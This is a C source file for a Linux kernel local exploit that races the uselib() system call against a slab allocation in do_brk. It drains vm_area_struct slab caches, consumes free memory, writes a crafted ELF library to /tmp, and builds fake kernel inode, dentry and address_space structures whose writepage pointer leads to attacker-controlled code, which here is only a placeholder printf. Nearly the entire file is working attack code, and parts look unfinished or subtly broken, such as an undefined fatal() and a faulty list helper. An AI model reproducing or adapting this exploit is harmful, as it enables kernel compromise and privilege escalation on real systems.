#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <syscall.h>
#include <limits.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>

#include <linux/elf.h>
#include <linux/linkage.h>

#include <asm/page.h>
#include <asm/ldt.h>
#include <asm/segment.h>

//	temp lib location
#define LIBNAME 	"/tmp/_elf_lib"


//	time delta to detect race
#define RACEDELTA	5000


//	do not touch
#define	SLAB_THRSH	128
#define	SLAB_PER_CHLD	(INT_MAX - 1)
#define LIB_SIZE	( PAGE_SIZE * 4 )
#define STACK_SIZE	( PAGE_SIZE * 4 )

#define TMPLEN		256
#define PGD_SIZE	( PAGE_SIZE*1024 )

#define PAGE_UP(x) ((x+PAGE_SIZE-1) & ~(PAGE_SIZE-1))
#define PG_dirty 4
#define INIT_LIST_HEAD(ptr) do { \
	(ptr)->next = (ptr); (ptr)->prev = (ptr); \
} while (0)

#define BASE (char *) 0x60000000
#define EATFILE "TTeatfile"

static char cstack[STACK_SIZE];
static char name[TMPLEN];
static char line[TMPLEN];

static pid_t consume_pid;

static volatile int
	val = 0,
	go = 0,
	finish = 0,
	delta = 0,
	ccnt=0,
	delta_max = RACEDELTA,
	map_flags = PROT_WRITE|PROT_READ;


static int
	cpid,
	uid,
	task_size,
	old_esp,
	map_count=0,
	map_base=0,
	map_addr,
	max_page;

static void * bad_mmap_return;

static struct timeval tm1, tm2;

static char *libname=LIBNAME;

static char *lib_addr = NULL;

static char *base = BASE;

struct list_head {
  	struct list_head      *next;
  	struct list_head      *prev;
};

struct spinlock_t {
};

struct wq_lock_t {
};

struct wait_queue_head_t {
	struct wq_lock_t lock;
	struct list_head task_list;
};

struct page {
	struct list_head list;		
	struct address_space *mapping;	
	unsigned long index;		
	struct page *next_hash;		
	atomic_t count;			
	unsigned long flags;		
};

struct address_space_operations {
	int (*writepage)(struct page *);
};

struct address_space {
	struct list_head	clean_pages;	
	struct list_head	dirty_pages;	
	struct list_head	locked_pages;	
	unsigned long		nrpages;	
	struct address_space_operations *a_ops;	
};

struct semaphore {
	atomic_t count;
	int sleepers;
	struct wait_queue_head_t wait;
};

struct rw_semaphore {
	signed int		activity;
	struct spinlock_t	wait_lock;
	struct list_head	wait_list;
};

struct inode {
  	struct list_head      i_hash;
  	struct list_head	i_list;
  	struct list_head	i_dentry;

  	struct list_head	i_dirty_buffers;
  	struct list_head	i_dirty_data_buffers;
	
  	unsigned long		i_ino;
  	atomic_t		i_count;
  	unsigned short	i_dev;
  	unsigned short	i_mode;
  	unsigned short	i_nlink;
  	unsigned int	i_uid;
  	unsigned int	i_gid;
  	unsigned short	i_rdev;
  	long long		i_size;
  	long			i_atime;
  	long			i_mtime;
  	long			i_ctime;
  	unsigned int		i_blkbits;
  	unsigned long		i_blksize;
  	unsigned long		i_blocks;
  	unsigned long		i_version;
  	unsigned short        i_bytes;
  	struct semaphore	i_sem;
  	struct rw_semaphore	i_alloc_sem;
  	struct semaphore	i_zombie;
  	void	*i_op;
  	void	*i_fop;
  	void	*i_sb;
  	struct wait_queue_head_t	i_wait;
  	void	*i_flock;
  	struct address_space	*i_mapping;
};

struct dentry {
  	atomic_t d_count;
  	unsigned int d_flags;
  	struct inode *d_inode;
};

struct libimg {
  	Elf32_Ehdr elf;
  	Elf32_Phdr ph;
};

/* the image of the evil library. */
struct libimg limg = {
  	{
  	e_ident: "\177ELF",
  	e_type: ET_EXEC,
  	e_machine: EM_386,
  	e_phoff: sizeof(Elf32_Ehdr),
  	e_ehsize: sizeof(Elf32_Ehdr),
  	e_phentsize: sizeof(Elf32_Phdr),
  	e_phnum: 1
  	},
  	{
  	p_type: PT_LOAD,
  	p_vaddr: 0,
  	p_memsz: 0
  	}
};

int evil_writepage(struct page *p)
{
  	printf("You've done bad things!!\n");
  	//exit(1);
}

static void __list_add(struct list_head *new,
			      struct list_head *prev,
			      struct list_head *next)
{
	next->prev = new;
	next->next = next;
	new->prev = prev;
	prev->next = new;
}

static void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head->next);
}

/* build the fake f_dentry
 * we've to emulate a lot of things!
 */
struct fakes {
	struct dentry fake_dentry;
	struct inode fake_inode;
	unsigned long inode1[128];
  	struct page dirty_page;
  	struct address_space fake_mapping;
  	struct address_space_operations fake_ops;
};

struct fakes *fakes;

void buildfakes()
{
	fakes = mmap(0, PAGE_UP(sizeof(*fakes)), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  	memset(fakes, 0, PAGE_UP(sizeof(*fakes)));
	
    /* this will be i_sem */
	int i;
	for(i = 0; i < 32; i++)
		fakes->inode1[i] = 1;
	memcpy(&fakes->fake_inode, &fakes->inode1[0], 32 * sizeof(fakes->inode1[0]));

  	fakes->fake_dentry.d_inode  = &fakes->fake_inode; 
	fakes->fake_inode.i_mapping = &fakes->fake_mapping;
	
  	fakes->fake_mapping.a_ops   = &fakes->fake_ops;
  	fakes->fake_ops.writepage   = &evil_writepage;

    /* make page dirty */
	fakes->dirty_page.flags |= (1 << PG_dirty);
	INIT_LIST_HEAD(&fakes->fake_mapping.locked_pages);
	INIT_LIST_HEAD(&fakes->fake_mapping.dirty_pages);
  	list_add(&fakes->dirty_page.list, &fakes->fake_mapping.dirty_pages);
}

int consume_memory()
{
	struct sysinfo info;
	char *vmem;
	
	sysinfo(&info);
	vmem = malloc(info.freeram);
	if (vmem == NULL)
	{
		perror("malloc");
		return -1;
	}
	memset(vmem, 0x90, info.freeram);

}

inline int tmdiff(struct timeval *t1, struct timeval *t2)
{
int r;

	r=t2->tv_sec - t1->tv_sec;
	r*=1000000;
	r+=t2->tv_usec - t1->tv_usec;
return r;
}


//	try to race do_brk sleeping on kmalloc, may need modification for SMP
int raceme(void* v)
{
	finish=1;

	for(;;) {
		errno = 0;

//	check if raced:
recheck:
		if(!go) sched_yield();
		gettimeofday(&tm2, NULL);
		delta = tmdiff(&tm1, &tm2);
		if(delta < (unsigned)delta_max) goto recheck;

//	check if lib VMAs exist as expected under race condition
recheck2:
		val = madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL);
		if(val) continue;
		errno = 0;
		val = madvise((void*) (lib_addr+PAGE_SIZE),
				LIB_SIZE-PAGE_SIZE, MADV_NORMAL);
		if( !val || (val<0 && errno!=ENOMEM) ) continue;

//	recheck race
		if(!go) continue;
		finish++;


		val = mmap(lib_addr + PAGE_SIZE, PAGE_SIZE*3, PROT_NONE,
			      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
		kill(consume_pid, SIGKILL);
		_exit(0);
	}

return 0;
}

//	return number of available SLAB objects in cache
int get_slab_objs(const char *sn)
{
static int c, d, u = 0, a = 0;
FILE *fp=NULL;
char x1[20];

	fp = fopen("/proc/slabinfo", "r");

	fgets(name, sizeof(name) - 1, fp);
	do {
		c = u = a = -1;
		if (!fgets(line, sizeof(line) - 1, fp))
			break;
		c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a,
			   &d, &d, &d, &d);
	} while (strcmp(name, sn));
	close(fileno(fp));
	fclose(fp);
	return c == 7 ? a - u : -1;
}

long memmaped_size = 0;

//	leave one object in the SLAB
inline void prepare_slab()
{
int *r;

	map_addr -= PAGE_SIZE;
	map_count++;
	map_flags ^= PROT_READ;
		
	r = (void*)mmap((unsigned)map_addr, PAGE_SIZE, map_flags,
			     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if(MAP_FAILED == r) {
		printf("--> prepare_slab(), %dMb\n", memmaped_size/1024/1024);
		//fatal("try again", 0);
	}
	memmaped_size += PAGE_SIZE;
	*r = map_addr;
}


//	use elf library and try to sleep on kmalloc
void exploitme()
{
int r, sz;

//	printf("\n    cat /proc/%d/maps", getpid() ); fflush(stdout);
//	helper clone
	finish=0;
	sz = sizeof(cstack) / sizeof(cstack[0]);
	cpid = clone(&raceme, (void*) &cstack[sz-16],
			CLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD, NULL );

//	synchronize threads
	while(!finish) sys_sched_yield();
	finish=0;

//	try to hit the kmalloc race
	for(;;) {

		r = get_slab_objs("vm_area_struct");
		//printf("\nfree slab = %d\n",r);
		while(r != 1 && r > 0) {
			prepare_slab();
			r--;
		}

		gettimeofday(&tm1, NULL);
		go = 1;
		r=sys_uselib(libname);
		go = 0;
		if(finish) break;

//	wipe lib VMAs and try again
		r = munmap(lib_addr, LIB_SIZE);
	}

//	seems we raced, free mem
	r = munmap(map_addr, map_base-map_addr + PAGE_SIZE);
	if(r) fatal("munmap 1", 0);
	r = munmap(lib_addr, PAGE_SIZE);
	if(r) fatal("munmap 2", 0);
	
}


//	make fake ELF library
void make_lib()
{
struct elfhdr eh;
struct elf_phdr eph;
static char tmpbuf[PAGE_SIZE];
int fd;

//	make our elf library
	umask(022);
	unlink(libname);
	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755);
	if(fd<0) fatal("open lib ("LIBNAME" not writable?)", 0);
	memset(&eh, 0, sizeof(eh) );

//	elf exec header
	memcpy(eh.e_ident, ELFMAG, SELFMAG);
	eh.e_type = ET_EXEC;
	eh.e_machine = EM_386;
	eh.e_phentsize = sizeof(struct elf_phdr);
	eh.e_phnum = 1;
	eh.e_phoff = sizeof(eh);
	write(fd, &eh, sizeof(eh) );

//	section header:
	memset(&eph, 0, sizeof(eph) );
	eph.p_type = PT_LOAD;
	eph.p_offset = 4096;
	eph.p_filesz = 4096;
	eph.p_vaddr = lib_addr;
	eph.p_memsz = LIB_SIZE;
	eph.p_flags = PF_W|PF_R|PF_X;
	write(fd, &eph, sizeof(eph) );

//	execable code
	lseek(fd, 4096, SEEK_SET);
	memset(tmpbuf, 0x90, sizeof(tmpbuf) );
	write(fd, &tmpbuf, sizeof(tmpbuf) );
	close(fd);
}

void chldcnt(int v)
{
	ccnt++;
}


//	alloc slab objects...
inline void do_wipe()
{
int *r, c=0, left=0;

	__asm__("movl	%%esp, %0" : : "m"(old_esp) );

	old_esp = (old_esp - PGD_SIZE+1) & ~(PGD_SIZE-1);
	old_esp = map_base? map_base : old_esp;

	for(;;) {
		if(left<=0)
			left = get_slab_objs("vm_area_struct");
		if(left <= SLAB_THRSH)
			break;
		left--;

		map_flags ^= PROT_READ;
		old_esp -= PAGE_SIZE;
		r = (void*)mmap(old_esp, PAGE_SIZE, map_flags,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 );
		if(MAP_FAILED == r)
			break;

		if(c>SLAB_PER_CHLD)
			break;
		if( (c%1024)==0 ) {
			if(!c) printf("\n");
			printf("\r    child %d VMAs %d", val, c);
			fflush(stdout);
		}
		c++;
	}
	printf("\r    child %d VMAs %d", val, c);
	fflush(stdout);
	kill(getppid(), SIGUSR1);
	for(;;) pause();
}

//	empty SLAB caches
void wipe_slab()
{
	signal(SIGUSR1, chldcnt);
	printf("\n[+] SLAB cleanup"); fflush(stdout);
	for(;;) {
		ccnt=0;
		val++;
		cpid = fork();
		if(!cpid)
			do_wipe();

		while(!ccnt) sys_sched_yield();
		if( get_slab_objs("vm_area_struct") <= SLAB_THRSH )
			break;
	}
	signal(SIGUSR1, SIG_DFL);
}

int main(int ac, char **av)
{
	lib_addr = base;

	buildfakes();

	consume_pid = fork();
	
	if (consume_pid == 0)
	{
		consume_memory();
		pause();
		return 0;
	}

	wipe_slab();
	make_lib();
	exploitme();

return 0;
}